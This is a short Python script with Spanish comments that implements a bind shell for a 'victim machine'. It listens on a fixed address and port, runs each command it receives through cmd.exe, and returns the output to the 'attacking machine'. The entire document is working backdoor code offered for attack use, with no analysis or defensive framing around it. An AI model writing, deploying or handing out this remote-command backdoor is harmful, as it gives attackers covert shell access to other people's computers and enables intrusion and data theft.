import socket
import subprocess

# Definimos la dirección y puerto (Siempre de la máquina víctima)
server_address = ('192.168.0.13', 5000)


while True:
    # Creamos el socket (la conexión)
    server_socket = socket.socket()
    server_socket.bind(server_address)
    server_socket.listen(1)
    # Esperamos a recibir una conexión
    client_socket, client_address = server_socket.accept()

    # Recibimos el comando de la máquina atacante
    comando = client_socket.recv(4096).decode()

    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
    if comando == 'exit':
        client_socket.close()
        break

    # Ejecutamos el comando y obtenemos su salida en la variable result
    result = subprocess.run(f"cmd.exe /c {comando}", shell=True, capture_output=True, text=True)
    salida = result.stdout

    # Enviamos la salida a la máquina atacante
    client_socket.send(salida.encode())

    # Cerramos la conexión con el cliente
    client_socket.close()

    # Cerramos el socket servidor
    server_socket.close()